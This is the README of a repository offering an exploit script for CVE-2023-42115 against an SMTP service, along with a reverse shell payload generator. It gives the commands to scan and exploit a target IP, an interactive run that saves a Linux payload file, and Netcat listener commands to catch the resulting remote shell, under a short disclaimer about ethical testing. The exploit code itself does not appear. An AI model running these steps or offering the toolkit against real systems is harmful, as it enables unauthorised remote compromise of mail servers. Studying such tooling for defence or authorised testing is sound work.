## CVE-2023-42115: Exploit and Payload Generator Scripts

This repository contains two Python scripts:

1. **`exploit.py`**: A script for exploiting CVE-2023-42115.
2. **`generate_payload.py`**: A script for generating reverse shell payloads.

## Prerequisites

Before running the scripts, ensure you have Python 3 installed on your system.

## Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/isotaka134/cve-2023-42115.git
   cd cve-2023-42115

2. **Install Dependencies**:

  Install the required Python libraries using pip. Run the following command to install all necessary dependencies listed in `requirements.txt`:

  ```bash
  pip install -r requirements.txt
  ```
## Usage
`exploit.py`

This script exploits the CVE-2023-42115 vulnerability.
  ```bash
  python exploit.py -t <target_ip> -p <target_port> [options]
  ```
Options:

**`-t`:  The IP address of the target.**

**`-p`: The port of the target service.**

Example:
1. **Scan Target**
   ```bash
   python exploit.py -t 192.168.1.10 -p 25  --mode SCAN
    ```
2. **Exploit vulnerability**
   ```bash
   python exploit.py -t 192.168.1.10 -p 25 --mode EXPLOIT -f /path/to/payload.sh
   ```
`generate_payload.py`

This script generates a reverse shell payload based on user input.

  ```bash
   python generate_payload.py
  ```
**Steps:**

 The script will prompt you for the following information:
 
**A. Payload type ( `linux` or `windows`)**

**B. Local IP: address for the reverse connection**

**C. Local Port**: for the reverse connection ** I:  If you are behind a router or using NAT, make sure to set up the correct port forwarding to your device running Netcat.** 

**D. Output file name** (e.g., payload.sh for `Linux` or payload.ps1 for `Windows`)

Example:
  ```bash
  python generate_payload.py
  Payload Generator
  Enter payload type (linux/windows): Linux 
  Enter local IP address: 127.0.0.1
  Enter local port: 4444
  Enter output file name (e.g., payload.sh or payload.ps1): Payload.sh
  Payload saved to Payload.sh
  ```
## Set Up a Listener
You need to set up a listener on your local machine to catch the reverse shell. You can use Netcat (nc) for this.
1. For Linux:
  Open a terminal and start a Netcat listener:
  ```bash
    nc -lvnp <YOUR_LOCAL_PORT>
  ```
2. For Windows:
  Open a Command Prompt and start a Netcat listener:
  ```bash
    nc -lvnp <YOUR_LOCAL_PORT>
  ```
**By following these steps, you should be able to create and use a payload to exploit `CVE-2023-42115` and receive a reverse shell connection.**
## Contributing
If you have suggestions for improvements or want to contribute, please open an issue or submit a pull request.
## Disclaimer
1. **Legal Disclaimer**: This script is intended for educational purposes and ethical testing. Unauthorized use against systems you do not own or have explicit permission to test is illegal and punishable by law.
2. **Ethical Use**: Use this script responsibly and only in environments where you can perform security testing.
## Troubleshooting
1. **Connection Issues**: Verify that the target is reachable and the SMTP service is running
2. **Vulnerability Detection**: Ensure that the service banner matches the expected output for the vulnerability check.
3. **Payload Execution**: Ensure that the payload file is correctly formatted and accessible.
## Contact
For questions or support, please contact 
```bash
 contact@isotakanobomaro.work.gd
